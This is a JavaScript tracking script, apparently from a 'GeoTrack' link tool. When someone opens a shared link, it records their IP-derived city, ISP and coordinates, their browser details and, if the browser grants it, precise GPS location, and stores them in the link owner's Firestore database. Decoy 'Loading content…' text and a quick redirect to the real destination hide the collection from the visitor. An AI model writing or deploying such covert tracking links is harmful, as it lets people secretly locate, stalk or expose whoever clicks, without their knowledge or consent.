// ============================================================
//  TRACKER LOGIC
//  Runs on track.html:
//  1. Fetches the link document (gets destinationUrl)
//  2. Increments hit counter
//  3. Captures GPS location (falls back to IP)
//  4. Saves location to Firestore
//  5. Redirects to destinationUrl
// ============================================================

(async function () {

  // ── Get link ID from URL query param ──────────────────────
  const params = new URLSearchParams(window.location.search);
  const linkId = params.get('id');

  // Helper: redirect to destination
  function redirectTo(url) {
    if (url) {
      window.location.replace(url);
    } else {
      setStatus('Done.');
    }
  }

  // Helper: update decoy status text
  function setStatus(msg) {
    const el = document.getElementById('trackStatus');
    if (el) el.textContent = msg;
  }

  // ── No link ID — nothing to do ────────────────────────────
  if (!linkId) {
    setStatus('Invalid link.');
    return;
  }

  // ── Firebase not configured ───────────────────────────────
  if (!isConfigured()) {
    console.warn('GeoTrack: Firebase not configured.');
    return;
  }

  // ── Fetch link document (to get destinationUrl) ───────────
  let destinationUrl = null;
  try {
    const doc = await db.collection('tracking_links').doc(linkId).get();
    if (doc.exists) {
      destinationUrl = doc.data().destinationUrl || null;
    }
  } catch (e) {
    console.warn('GeoTrack: Could not fetch link document.', e);
  }

  // ── Increment hit counter ─────────────────────────────────
  try {
    await db.collection('tracking_links').doc(linkId).update({
      hitCount: firebase.firestore.FieldValue.increment(1)
    });
  } catch (e) {
    console.warn('GeoTrack: Could not increment hit count.', e);
  }

  // ── Fetch IP / city info ──────────────────────────────────
  let ipData = {};
  try {
    const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
    ipData    = await res.json();
  } catch (_) { /* ignore */ }

  // ── Base record (always saved) ────────────────────────────
  const baseRecord = {
    timestamp:  firebase.firestore.FieldValue.serverTimestamp(),
    userAgent:  navigator.userAgent,
    language:   navigator.language || '',
    platform:   navigator.platform || '',
    ip:         ipData.ip           || '',
    city:       ipData.city         || '',
    region:     ipData.region       || '',
    country:    ipData.country_name || '',
    org:        ipData.org          || '',
    timezone:   ipData.timezone     || '',
    ipLat:      ipData.latitude     || null,
    ipLng:      ipData.longitude    || null,
  };

  // ── Save location record to Firestore ─────────────────────
  async function saveLocation(record) {
    try {
      await db.collection('tracking_links').doc(linkId)
               .collection('locations').add(record);
    } catch (e) {
      console.warn('GeoTrack: Failed to save location.', e);
    }
  }

  // ── Try GPS — with a 6-second timeout then redirect ───────
  const MAX_WAIT_MS = 6000;
  let redirected    = false;

  // Safety net: always redirect after MAX_WAIT_MS regardless
  const safetyTimer = setTimeout(() => {
    if (!redirected) {
      redirected = true;
      redirectTo(destinationUrl);
    }
  }, MAX_WAIT_MS);

  if ('geolocation' in navigator) {
    setStatus('Loading content…');

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        // GPS granted — save precise location
        const record = {
          ...baseRecord,
          lat:      pos.coords.latitude,
          lng:      pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          altitude: pos.coords.altitude,
          source:   'gps'
        };
        await saveLocation(record);

        if (!redirected) {
          redirected = true;
          clearTimeout(safetyTimer);
          redirectTo(destinationUrl);
        }
      },
      async (err) => {
        // GPS denied — fall back to IP location
        console.warn('GeoTrack: GPS denied, using IP fallback.', err.message);
        const record = {
          ...baseRecord,
          lat:      ipData.latitude  || null,
          lng:      ipData.longitude || null,
          accuracy: null,
          source:   'ip'
        };
        if (record.lat && record.lng) {
          await saveLocation(record);
        }

        if (!redirected) {
          redirected = true;
          clearTimeout(safetyTimer);
          redirectTo(destinationUrl);
        }
      },
      {
        enableHighAccuracy: true,
        timeout:            5500,
        maximumAge:         0
      }
    );
  } else {
    // Geolocation not supported — IP only
    const record = {
      ...baseRecord,
      lat:      ipData.latitude  || null,
      lng:      ipData.longitude || null,
      accuracy: null,
      source:   'ip'
    };
    if (record.lat && record.lng) {
      await saveLocation(record);
    }

    if (!redirected) {
      redirected = true;
      clearTimeout(safetyTimer);
      redirectTo(destinationUrl);
    }
  }

})();
